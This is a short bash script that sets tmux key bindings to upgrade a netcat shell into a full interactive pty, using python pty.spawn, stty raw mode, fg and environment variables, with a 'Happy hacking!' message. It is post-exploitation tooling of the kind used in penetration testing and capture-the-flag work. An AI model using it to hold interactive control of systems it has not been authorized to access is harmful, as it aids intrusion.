#! /usr/bin/env bash

if [ -z "$TMUX" ]; then
    echo "[x] Must be used within a tmux session."
    exit 1
fi

# Set this to /bin/sh for greater generality
SH=/bin/sh

tmux bind-key M-Enter \
     display-message "Spawning a pty through python..."               \\\; \
     send-keys "python -c \"import pty; pty.spawn('$SH')\""     Enter \\\; \
     run-shell "sleep 0.2"                                            \\\; \
     display-message "Suspending the listener..."                     \\\; \
     send-keys C-z                                                    \\\; \
     run-shell "sleep 0.2"                                            \\\; \
     display-message "Voiding the terminal settings..."               \\\; \
     send-keys "stty raw -echo"                                 Enter \\\; \
     run-shell "sleep 0.2"                                            \\\; \
     display-message "Returning the listener to the foreground..."    \\\; \
     send-keys "fg"                                             Enter \\\; \
     run-shell "sleep 0.2"                                            \\\; \
     display-message "Configuring terminal settings..."               \\\; \
     send-keys "reset"                                          Enter \\\; \
     run-shell "tmux send-keys                                             \
                     \"stty rows #{pane_height} cols #{pane_width}\"       \
                     Enter"                                           \\\; \
     display-message "Setting environment variables..."               \\\; \
     send-keys "export HOME=/tmp"                               Enter \\\; \
     send-keys "export SHELL=\$0"                               Enter \\\; \
     send-keys "export TERM=screen"                             Enter \\\; \
     send-keys "clear; bash 2>/dev/null"                        Enter \\\; \
     display-message "Happy hacking!"

# use this one after resizing the tmux pane, to fix up the nc pty
tmux bind-key M-= \
     run-shell "tmux send-keys                                             \
                     \"stty rows #{pane_height} cols #{pane_width}\"       \
                     Enter"

echo "[+] Hit M-Enter in an active netcat shell to upgrade to a full pty."
echo "    Thanks to Phineas Fisher for pointing out this trick."
# I should do a local enumeration script here, too.

